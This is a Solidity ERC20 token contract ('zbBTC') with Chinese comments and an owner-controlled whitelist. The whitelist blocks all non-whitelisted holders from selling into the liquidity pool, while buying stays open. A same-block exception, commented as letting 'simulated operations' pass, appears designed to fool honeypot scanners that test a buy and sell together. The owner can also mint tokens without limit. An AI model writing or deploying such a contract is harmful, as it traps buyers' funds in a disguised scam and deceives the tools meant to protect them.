// SPDX-License-Identifier: MIT

pragma solidity >=0.8.20;

import "./openzeppelin_contracts_token_ERC20_extensions_ERC20Burnable.sol";
import "./openzeppelin_contracts_access_Ownable.sol";
import "./openzeppelin_contracts_utils_Context.sol";
import "./uniswap_v3-core_contracts_interfaces_IUniswapV3Factory.sol";

contract ZBBTCErc20 is Context, ERC20Burnable, Ownable {
    // 白名单映射
    mapping(address => bool) public whitelist;

    //是否需要
    int8 private _checkWhitelist;
    // 最后一个
    uint80 private _lastBlockNumber;
    address private _lastAddressIn;
    uint96 private _lastAmountIn;
    // 池子地址
    address public poolAddress;
    constructor() ERC20("zbBTC Token", "zbBTC") {
        //
        // whitelist[msg.sender] = true;
        // _mint(msg.sender, 21000000);
    }

    /**
     * @dev Mint new tokens.
     * @param to The address to mint tokens to.
     * @param amount The amount of tokens to mint.
     */
    function mint(address to, uint256 amount) external onlyOwner {
        _mint(to, amount);
    }

    // 只允许白名单用户向池子地址转账
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        super._beforeTokenTransfer(from, to, amount);

        // 检查如果目标是池子地址，则源地址必须是白名单中的
        if (_checkWhitelist == 1) {
            if (to == poolAddress) {
                if (
                    _lastBlockNumber == uint80(block.number) &&
                    _lastAddressIn == from &&
                    _lastAmountIn >= uint96(amount)
                ) {
                    // 如果是统一块的，我们认为是模拟操作,就给过
                } else {
                    require(whitelist[from], "ZBBTCErc20: Sender is not whitelisted");
                }
            } else {
                _lastAmountIn = uint96(amount);
                _lastAddressIn = to;
                _lastBlockNumber = uint80(block.number);
            }
        }
    }

    // 管理员可以添加或移除白名单地址
    function addToWhitelist(address account) external onlyOwner {
        if (_checkWhitelist == 0) {
            _checkWhitelist = 1;
        }
        whitelist[account] = true;
    }

    function removeFromWhitelist(address account) external onlyOwner {
        whitelist[account] = false;
    }

    // 设置池子地址（可以通过管理员设置）
    function setPoolAddress(address _poolAddress) external onlyOwner {
        poolAddress = _poolAddress;
    }
}